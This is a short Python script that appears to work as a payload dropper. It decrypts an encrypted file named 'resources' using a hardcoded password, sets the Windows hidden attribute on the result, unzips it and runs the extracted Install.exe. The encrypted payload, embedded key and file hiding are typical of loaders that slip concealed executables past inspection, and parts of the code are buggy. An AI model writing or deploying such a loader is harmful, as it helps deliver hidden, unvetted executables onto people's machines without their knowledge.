import os
from zipfile import ZipFile
import pyAesCrypt
import time
import ctypes

def spawn_process():
    path = os.path.join(os.getcwd(),"Install.exe")
    os.spawnv(os.P_WAIT,path)


def HideFile(filenames):
    print(filenames)
    for filename in filenames:
        #filename = os.path.join(os.getcwd(),filename)
        FILE_ATTRIBUTE_HIDDEN = 0x02
        if(os.name == 'nt'):
            kernel32 = ctypes.WinDLL('kernel32',use_last_error=True)
            attrs = kernel32.GetFileAttributesW(filename)
            if(attrs == -1):
                raise ctypes.WinError(ctypes.get_last_error())
            attrs |= FILE_ATTRIBUTE_HIDDEN
            if(not kernel32.SetFileAttributesW(filename,attrs)):
                raise ctypes.WinError(ctypes.get_last_error)
            return filename
        elif(os.name == 'posix'):
            return "." + filename


def unzipFile(filename,extract_to=os.getcwd()):
    with ZipFile(filename,'r') as fzip:

        fzip.extractall(extract_to)
        fzip.close()
    HideFile(filenames=['Install'])
    return None


_file_to_find = os.path.join(os.getcwd(),"resources")
_dest_file = os.path.join(os.getcwd(),"install.zip")

def decrypt_file(file_to_decrypt,dest_file,password):
    bufferSize = 64 * 1024
    pyAesCrypt.decryptFile(file_to_decrypt,dest_file,password,bufferSize=bufferSize)
    HideFile(filenames=[dest_file])

def main(sourceFile,destFile,password):
    decrypt_file(sourceFile,destFile,password)
    unzipFile(destFile)
    spawn_process()

if __name__ == "__main__":
    password = "sCw?@$f*g6c!PAQLx@gP!H@!L+vrfGd6T#$yzx59%XBXr$e_-QNqJLCZfs$JqTgXVgFKcWPW%*@rjtW&!zR*?pc!bvEmcu8*?C%dq_HavH^QQ=3V9XKBXdkkp!D55h5U"
    main(sourceFile=_file_to_find,destFile=_dest_file,password=password)
